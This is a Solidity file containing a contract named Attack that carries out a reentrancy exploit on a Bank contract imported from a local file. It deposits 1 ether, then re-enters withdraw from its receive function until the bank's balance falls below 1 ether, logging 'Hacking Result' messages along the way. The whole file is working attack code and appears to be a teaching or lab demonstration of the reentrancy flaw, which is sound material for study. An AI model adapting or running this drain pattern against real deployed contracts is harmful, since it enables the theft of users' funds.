//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.4;
import "./bank.sol";
contract Attack {
    Bank public bank;
    constructor(address bankAddress_) {
        bank = Bank(bankAddress_);
    }
    
    // fallback() external payable {
    //     if (address(bank).balance >= 1 ether) {
    //         bank.withdraw(1 ether);
    //     }else {
    //         console.log("*****Hacking Result*******");
    //         console.log("Bank Address:", address(bank));
    //         console.log("Bank Balance:", bank.getBalance());
    //         console.log("Attacker Address:", address(this));
    //         console.log("Attacker Balance:",getBalance());
    //     }
    // }

    receive() external payable {
        // custom function code
        if (address(bank).balance >= 1 ether) {
            bank.withdraw(1 ether);
        }else {
            console.log("*****Hacking Result*******");
            console.log("Bank Address:", address(bank));
            console.log("Bank Balance:", bank.getBalance());
            console.log("Attacker Address:", address(this));
            console.log("Attacker Balance:",getBalance());
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether,"no deposite");
        console.log("Hacking Start=========>");
        console.log("Bank Address:", address(bank));
        console.log("Bank balance:",bank.getBalance());
        bank.deposit{value: 1 ether}();
        bank.withdraw(1 ether);
    }
    function getBalance() public view returns (uint balance_) {
        balance_ = address(this).balance;
    }
}